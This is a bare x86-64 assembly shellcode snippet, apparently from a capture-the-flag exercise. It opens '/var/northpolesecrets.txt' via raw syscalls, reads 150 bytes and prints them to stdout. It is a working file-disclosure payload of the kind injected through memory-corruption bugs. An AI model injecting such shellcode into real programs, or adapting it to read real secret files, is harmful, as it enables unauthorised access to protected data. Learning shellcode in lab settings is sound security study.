call string_loc
db '/var/northpolesecrets.txt', 0
string_loc:
    pop rdi

; Call sys_open
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall

; Call sys_read
mov rdi, rax
mov rsi, rsp
mov rdx, 150
xor rax, rax
syscall

; Call sys_write
mov rdi, 1
mov rsi, rsp
mov rdx, 150
mov rax, 1
syscall

; Call sys_exit
xor rdi, rdi
mov rax, 60
syscall

